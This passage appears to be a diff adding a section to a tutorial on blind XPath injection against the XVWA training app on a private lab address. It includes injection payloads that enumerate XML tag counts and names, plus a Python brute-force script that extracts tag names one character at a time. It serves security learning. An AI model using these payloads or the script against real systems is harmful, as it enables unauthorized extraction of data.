@@ -339,3 +339,137 @@ We can add this in our structure file (data.xml)
 
 ## Enumerate the name of secondary tags
 
+````bash
+search=1' and count(/*[1]/*)>'7&submit=
+````
+
+You can put a `[1]` to indicate the discover tag and count the rest of tags in the next level
+
+In this case we only see the coffee related with id 1
+
+The total number of tags is **10**
+
+````bash
+search=1' and count(/*[1]/*)>='10&submit=
+````
+
+We add this information in our data.xml file
+
+````xml
+<Coffees>
+	<Tag></Tag>
+	<Tag></Tag>
+	<Tag></Tag>
+	<Tag></Tag>
+	<Tag></Tag>
+	<Tag></Tag>
+	<Tag></Tag>
+	<Tag></Tag>
+	<Tag></Tag>
+	<Tag></Tag>
+</Coffees>
+````
+
+To know the name we can realize this:
+
+First tag
+
+````bash
+search=1' and name(/*[1]/*[1])='Coffee&submit=
+````
+
+Second tag
+
+````bash
+search=1' and name(/*[1]/*[2])='Coffee&submit=
+````
+
+...
+
+Remember that you can go character by character playing with **substring**
+
+````bash
+search=1' and substring(name(/*[1]/*[1]),1,1)='C&submit=
+````
+
+We can change a few things in the script and do the same process
+
+We have to change the post_data (only search), the length of the response, the character that have to iterate
+
+To see the new length, we can use `print(len(r.text))` and comment the rest, in this case is **8686**
+
+To know the length of the tag you can use this:
+
+````bash
+search=1' and string-length(name(/*[1]/*[1]))='6&submit=
+````
+
+````python
+#!/usr/bin/python3
+
+from pwn import *
+import time, sys, pdb, string, signal, requests
+
+# Ctrl_c
+
+def def_handler(sig, frame):
+    print("\n\n[!] Saliendo...\n")
+    sys.exit(1)
+
+signal.signal(signal.SIGINT, def_handler)
+
+# Global variables
+
+main_url = "http://192.168.1.70/xvwa/vulnerabilities/xpath/"
+characters = string.ascii_letters # Characters in lowercase and uppercase
+
+def xPathInjection():
+    
+    data = ""
+
+    p1 = log.progress("Fuerza bruta")
+    p1.status("Iniciando ataque de fuerza bruta")
+
+    time.sleep(2)
+
+    p2 = log.progress("Data")
+
+    for position in range(1,7):
+        for character in characters:                    
+            
+            post_data = { 
+                    'search': "1' and substring(name(/*[1]/*[1]),%d,1)='%s"  % (position, character),
+                    'submit': '' 
+            }
+    
+
+            r = requests.post(main_url, data=post_data)
+
+            if len(r.text) != 8686:
+                data += character
+                p2.status(data)
+
+                # ----------------------
+                # TODO
+                break
+                # ----------------------
+
+    p1.success("Brute force attack finished")
+    p2.success(data)
+
+if __name__ == '__main__':
+    
+    xPathInjection()
+
+````
+
+Yeah!, we have it
+![](../../Images/Pasted%20image%2020230904163639.png)
+
+You can do this for every second tags (in this case all the tags are the same Coffee)
+
+````python
+'search': "1' and substring(name(/*[1]/*[2]),%d,1)='%s"  % (position, character),
+````
+
+You can add a new loop to iterate in the second square brackets
